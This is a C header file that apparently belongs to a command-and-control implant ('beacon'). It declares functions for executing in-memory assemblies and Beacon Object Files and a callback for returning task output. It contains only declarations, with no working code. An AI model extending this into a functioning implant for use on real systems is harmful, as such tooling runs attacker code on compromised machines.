#pragma once
#include <stdint.h>

typedef int (*beacon_task_result_fn)(void *ctx,
                                     uint32_t label,
                                     uint8_t type,
                                     uint8_t code,
                                     uint16_t flags,
                                     const char *output,
                                     uint32_t output_len);

int beacon_task_exec_assembly(const uint8_t *task_data,
                              uint32_t task_data_len,
                              uint32_t label,
                              beacon_task_result_fn send_result_fn,
                              void *send_ctx);

int beacon_task_bof(const uint8_t *task_data,
                    uint32_t task_data_len,
                    uint32_t label,
                    beacon_task_result_fn send_result_fn,
                    void *send_ctx);
